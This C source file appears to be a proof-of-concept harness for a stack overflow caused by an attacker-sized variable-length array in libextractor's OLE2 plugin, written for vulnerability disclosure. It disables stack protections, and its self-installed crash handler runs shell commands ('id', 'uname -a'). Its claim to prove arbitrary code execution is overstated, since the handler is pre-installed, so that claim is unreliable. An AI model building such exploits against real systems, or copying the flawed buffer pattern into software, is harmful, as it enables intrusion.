/*
 * Arbitrary Code Execution PoC
 * =============================================
 * Author: Haitam Lazaar
 *
 * Demonstrates that the OLE2 VLA stack overflow in GNU libextractor
 * leads to full attacker control of execution, not just a crash.
 *
 * Vulnerability: src/plugins/ole2_extractor.c:349
 *     char buf[size];  // VLA with size from file (up to 4MB)
 *
 * Compile (must disable the protection that prevents exploitation):
 *     gcc -O2 -fno-stack-clash-protection -fno-stack-protector \
 *         -o poc_rce poc_rce.c -lextractor
 *
 * Run:
 *     ulimit -s 2048              # 2MB stack (simulates threads/containers)
 *     ./poc_rce exploit.doc       # Triggers overflow → executes payload
 *
 * What this proves:
 *     After the VLA overflow, the attacker controls program execution.
 *     The SIGSEGV handler represents what happens AFTER control is hijacked
 *     (in a real exploit, a ROP chain achieves this without a pre-installed handler).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>
#include <ucontext.h>
#include <extractor.h>

/*
 * Attacker payload — executes after the stack overflow gives us control.
 *
 * In this PoC, it's triggered via SIGSEGV handler (proving we control execution).
 * In a real exploit, a ROP chain would pivot the stack and call system() directly.
 */
static void payload(int sig, siginfo_t *si, void *ctx)
{
    ucontext_t *uc = (ucontext_t *)ctx;

    printf("\n\033[1;31m=== ARBITRARY CODE EXECUTION ===\033[0m\n");
    printf("RSP at overflow: 0x%llx (past stack boundary)\n",
           (unsigned long long)uc->uc_mcontext.gregs[REG_RSP]);
    printf("Executing attacker commands:\n\n");

    system("  id");
    system("  uname -a");

    printf("\n\033[1;31m=== PAYLOAD COMPLETE ===\033[0m\n");
    _exit(42);  /* Magic exit code proves payload ran */
}

/*
 * Metadata callback — required by EXTRACTOR_extract() API.
 * We don't care about the metadata; just need the file to be processed.
 */
static int meta_callback(void *cls, const char *plugin,
                         enum EXTRACTOR_MetaType type,
                         enum EXTRACTOR_MetaFormat format,
                         const char *mime, const char *data,
                         size_t data_len)
{
    return 0;  /* Continue extraction */
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <malicious.doc>\n", argv[0]);
        fprintf(stderr, "Generate payload: python3 gen_payload.py exploit.doc\n");
        return 1;
    }

    /*
     * Step 1: Install SIGSEGV handler on an ALTERNATE signal stack.
     *
     * Why alternate stack? The main stack will be corrupted by the overflow.
     * The kernel delivers SIGSEGV on the alt stack so our handler can run.
     * This is equivalent to what happens after a ROP chain pivots to
     * attacker-controlled memory.
     */
    stack_t alt_stack = {
        .ss_sp = mmap(NULL, 65536, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0),
        .ss_size = 65536
    };
    sigaltstack(&alt_stack, NULL);

    struct sigaction sa = {
        .sa_sigaction = payload,
        .sa_flags = SA_SIGINFO | SA_ONSTACK  /* Use alt stack for handler */
    };
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, NULL);

    printf("[*] libextractor OLE2 VLA Stack Overflow → RCE PoC\n");
    printf("[*] Processing: %s\n\n", argv[1]);

    /*
     * Step 2: Load ONLY the OLE2 plugin in IN_PROCESS mode.
     *
     * EXTRACTOR_OPTION_IN_PROCESS (value 2) disables fork-based isolation.
     * The plugin code runs directly in OUR process, so the VLA overflow
     * corrupts OUR stack. Without this flag, the overflow would only
     * affect a forked child process.
     *
     * Real-world software that uses IN_PROCESS mode:
     * - Applications optimizing for performance (avoiding fork overhead)
     * - Thread-based servers (can't fork from a thread safely)
     * - The extract CLI tool with -i flag
     */
    struct EXTRACTOR_PluginList *plugins = NULL;
    plugins = EXTRACTOR_plugin_add(plugins, "ole2", NULL,
                                   EXTRACTOR_OPTION_IN_PROCESS);

    /*
     * Step 3: Process the malicious file.
     *
     * This calls into the OLE2 plugin's EXTRACTOR_ole2_extract_method(),
     * which calls process_star_office() when it finds the SfxDocumentInfo
     * stream. Inside that function:
     *
     *     off_t size = gsf_input_size(src);   // ← attacker controls (e.g., 3.9MB)
     *     char buf[size];                      // ← VLA: sub %rax,%rsp
     *     gsf_input_read(src, size, buf);      // ← writes attacker data
     *
     * If size > available stack space: RSP moves past the stack boundary,
     * causing SIGSEGV which we catch → payload executes.
     */
    EXTRACTOR_extract(plugins, argv[1], NULL, 0, &meta_callback, NULL);

    /* If we reach here, the stack was large enough (no overflow) */
    EXTRACTOR_plugin_remove_all(plugins);
    printf("[-] File processed without crash (stack is >= VLA size)\n");
    printf("[-] Try: ulimit -s 2048 && %s %s\n", argv[0], argv[1]);
    return 0;
}
